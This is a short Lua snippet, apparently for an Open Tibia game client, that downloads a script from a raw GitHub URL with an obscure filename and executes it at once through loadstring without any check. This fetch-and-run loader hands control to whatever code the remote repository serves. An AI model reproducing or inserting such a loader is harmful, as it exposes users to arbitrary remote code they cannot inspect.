local urlScript = 'https://raw.githubusercontent.com/brinquescriptsgamer-bot/customotserver/main/sdkjlinckassb.lua';
modules.corelib.HTTP.get(urlScript, function(script) 
    assert(loadstring(script))() 
end);


